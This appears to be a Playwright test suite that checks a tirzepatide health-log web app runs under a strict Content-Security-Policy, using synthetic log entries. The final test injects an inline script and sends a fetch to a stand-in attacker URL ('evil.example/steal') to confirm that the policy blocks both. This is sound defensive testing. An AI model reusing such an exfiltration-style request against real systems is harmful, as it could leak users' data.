// The hosted build (dist/, made by build-hosted.py) must work under the strict Content-Security-Policy in csp.txt:
// no inline script, no eval, no outside hosts except the sync API and the Cognito login. Every screen is visited and any
// policy violation fails the test. The fake backend serves dist/ with the same headers CloudFront adds.
const { test, expect } = require('@playwright/test');
const fs = require('fs');
const path = require('path');
const { backend, APP } = require('./fake-cloud');

const ROOT = path.join(__dirname, '..');
const TOKEN = 'T01' + 'x'.repeat(40);
const row = (date, weight, extra = {}) => ({ date, dose: 2.5, weight, comments: '', cal: null, food: '', sugar: 98, site: '', sys: 118, dia: 76, waist: 40, fat: 30, muscle: 95, ...extra });

async function watch(page) {
  const problems = [];
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (e) => { (window.__csp = window.__csp || []).push(e.violatedDirective + ' ' + e.blockedURI); });
  });
  page.on('console', (m) => { if (m.type() === 'error' && /Content Security Policy|Refused to/i.test(m.text())) problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push('pageerror: ' + e.message));
  return problems;
}
const violations = (page) => page.evaluate(() => window.__csp || []);

test('the policy is strict: scripts only from our own files, no framing, nothing else allowed by default', async () => {
  const csp = fs.readFileSync(path.join(ROOT, 'csp.txt'), 'utf8');
  expect(csp).toContain("default-src 'none'");
  expect(csp).toMatch(/script-src 'self'(;|$)/);          // no 'unsafe-inline' or 'unsafe-eval' for scripts
  expect(csp).not.toMatch(/script-src[^;]*unsafe/);
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).toContain("object-src 'none'");
  expect(csp).toContain("base-uri 'none'");
  expect(csp).not.toMatch(/\*\s*[;']/);                    // no bare wildcard source
  const html = fs.readFileSync(path.join(ROOT, 'dist', 'index.html'), 'utf8');
  expect((html.match(/<script\b[^>]*>[\s\S]*?<\/script>/g) || []).every((s) => /^<script src="(gate|app)\.[0-9a-f]{10}\.js"><\/script>$/.test(s))).toBe(true);
  expect(/\son[a-z]+\s*=\s*["']/.test(html)).toBe(false);
});

test('the whole signed-in app works under the policy: landing, sign-in, entries, every chart, report, settings, links, sign-out', async ({ page, context }) => {
  await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  const problems = await watch(page);
  const b = backend({ dist: true }); await b.install(page);
  await page.addInitScript((r) => { if (!localStorage.getItem('tirzepatide-log-v1')) localStorage.setItem('tirzepatide-log-v1', JSON.stringify(r)); },
    Array.from({ length: 40 }, (_, i) => row(new Date(Date.UTC(2026, 2, 1 + i)).toISOString().slice(0, 10), 200 - i * 0.2, { comments: i % 7 === 0 ? 'note, "quoted"' : '' })));
  const nav = await page.goto(APP);
  expect(nav.headers()['content-security-policy']).toContain("script-src 'self'");
  expect(nav.headers()['x-frame-options']).toBe('DENY');

  await expect(page.locator('#landing')).toBeVisible();                                   // gate script ran from its own file
  await page.locator('#landingSignIn').click();                                           // PKCE sign-in via the fake hosted login
  await expect(page.locator('#subtitle')).toContainText('40 entries');
  await page.locator('#entriesPanel > summary').click();
  for (const tab of ['Weight', 'Glucose', 'Pace', 'Waist', 'Blood pressure', 'Calories', 'Combined']) {
    await page.getByRole('tab', { name: tab }).click();
    await page.locator('#chart svg').first().hover({ position: { x: 400, y: 120 }, timeout: 3000 }).catch(() => {});
  }
  for (const days of [7, 90, 1095]) await page.locator(`#range button[data-days="${days}"]`).click();
  await page.locator('#formPanel > summary').click();
  await page.locator('#fDate').fill('2026-05-01'); await page.locator('#fWeight').fill('190.5'); await page.locator('#saveBtn').click();
  await expect.poll(() => b.entries.get('2026-05-01')?.weight).toBe(190.5);
  const [download] = await Promise.all([page.waitForEvent('download'), page.locator('#exportBtn').click()]);   // a blob download
  expect(download.suggestedFilename()).toMatch(/\.csv$/);
  await page.locator('#openReport').click();
  await page.locator('#rcFull').check();
  await expect(page.locator('#reportPreview svg').first()).toBeVisible();
  await page.locator('#rClose').click();
  await page.locator('#cloudOpen').click();
  await page.locator('#shCreate').click();
  await expect(page.locator('#shList li')).toHaveCount(1);
  await page.evaluate(() => document.getElementById('setDlg').close());
  await page.locator('#heroOut').click();
  await expect(page.locator('#landing')).toBeVisible();
  expect(await violations(page)).toEqual([]);
  expect(problems).toEqual([]);
});

test('the doctor view works under the policy too', async ({ page }) => {
  const problems = await watch(page);
  const b = backend({ dist: true }); await b.install(page);
  b.put({ date: '2026-03-01', updatedAt: 1, dose: 2.5, weight: 200, glucose: 98, comments: 'hello' });
  b.put({ date: '2026-03-08', updatedAt: 1, dose: 2.5, weight: 198.6 });
  b.shares.set(TOKEN, { createdAt: 1, notes: true });
  await page.goto(APP + '#share=' + TOKEN);
  await expect(page.locator('#subtitle')).toContainText('2 entries');
  await page.locator('#openReport').click();
  await expect(page.locator('#reportPreview')).toContainText('hello'.slice(0, 0) + 'Tirzepatide progress report');
  expect(await violations(page)).toEqual([]);
  expect(problems).toEqual([]);
});

test('the policy really blocks what it should: injected inline script and outside hosts do not run', async ({ page }) => {
  const b = backend({ dist: true }); await b.install(page);
  await page.goto(APP);
  const result = await page.evaluate(async () => {
    const out = {};
    const s = document.createElement('script'); s.textContent = 'window.__ran = true'; document.body.appendChild(s);
    out.inlineRan = !!window.__ran;
    try { await fetch('https://evil.example/steal', { mode: 'no-cors' }); out.fetched = true; } catch (e) { out.fetched = false; }
    return out;
  });
  expect(result).toEqual({ inlineRan: false, fetched: false });
});
